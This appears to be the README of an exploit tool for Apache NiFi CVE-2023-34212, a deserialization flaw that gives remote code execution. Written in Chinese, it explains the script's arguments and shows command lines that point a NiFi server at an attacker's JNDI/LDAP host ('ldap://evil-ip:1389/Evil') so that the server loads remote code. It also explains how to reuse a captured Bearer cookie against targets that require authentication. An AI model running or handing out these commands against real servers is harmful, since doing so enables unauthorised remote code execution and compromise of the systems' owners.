# Apache NiFi 反序列化漏洞(CVE-2023-34212)

攻击者利用此漏洞执行代码。

https://lists.apache.org/thread/w5rm46fxmvxy216tglf0dv83wo6gnzr5

Apache NiFi 从1.14.0版本开始默认要求身份认证。

## 漏洞利用
Usage: 

```shell
CVE-2023-34212.py [-h] -t TARGET -u JNDIURL -l JNDIFACTORYLOCATION
                         [-c COOKIEBEARER]
                         [--JndiFactoryClass JNDIFACTORYCLASS]
```
optional arguments:

* -h, --help            show this help message and exit

* -t TARGET, --target TARGET
                        target 指定目标NIFI系统的地址,**必要参数**. eg:
                        http://192.168.25.147:8080

* -u JNDIURL, --JndiUrl JNDIURL
                        JNDI服务监听地址,**必要参数**. eg: ldap://xx.xx.xx.xx:1389

* -l JNDIFACTORYLOCATION, --JndiFactoryLocation JNDIFACTORYLOCATION
                        访问JNDI实例对象地址,**必要参数**. eg: ldap://xx.xx.xx.xx:1389/Evil

* -c COOKIEBEARER, --cookieBearer COOKIEBEARER
                        Cookie中Bearer值.

* --JndiFactoryClass JNDIFACTORYCLASS
                        JNDI工厂类. eg: com.sun.jndi.ldap.LdapCtxFactory


**注意：**

1. 通常以`https`开头的目标要求认证，运行脚本时须携带Cookie，否则不通过。\
    eg:&nbsp; 数据包显示`Cookie: __Host-Authorization-Bearer=eyJhbGciOiJIUzI1NiJ9-rqWw`，则在运行脚本时添加\
`--cookieBearer=eyJhbGciOiJIUzI1NiJ9-rqWw`即可。

2. `JNDIURL`与`JndiFactoryLocation`中的地址一致，指向相同的JNDI服务器。\
    eg:&nbsp; -u=ldap://123.123.123.123:1389 -l=ldap://123.123.123.123:1389/Evil
     
<br>

测试**不要求认证**的目标：

```
python CVE-2023-34212.py -t http://192.168.25.152:8080 -u ldap://evil-ip:1389 -l ldap://evil-ip:1389/Evil
```
![](pic/nifi-http.gif)

<br>

测试**要求认证**的目标：

```
python CVE-2023-34212.py -t https://192.168.25.151:8443 -u ldap://evil-ip:1389 -l ldap://evil-ip:1389/Evil --cookieBearer=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlzcyI6IlNpbmdsZVVzZXJMb2dpbklkZW50aXR5UHJvdmlkZXIiLCJhdWQiOiJTaW5nbGVVc2VyTG9naW5JZGVudGl0eVByb3ZpZGVyIiwicHJlZmVycmVkX3VzZXJuYW1lIjoiYWRtaW4iLCJraWQiOjEsImV4cCI6MTY4NzIwNjMwNywiaWF0IjoxNjg3MTc3NTA3fQ.YsgXKWdhT0jAupZVTHEsIDc20xbW3kk67EopnbH0FlM
```
![](pic/nifi-https.gif)
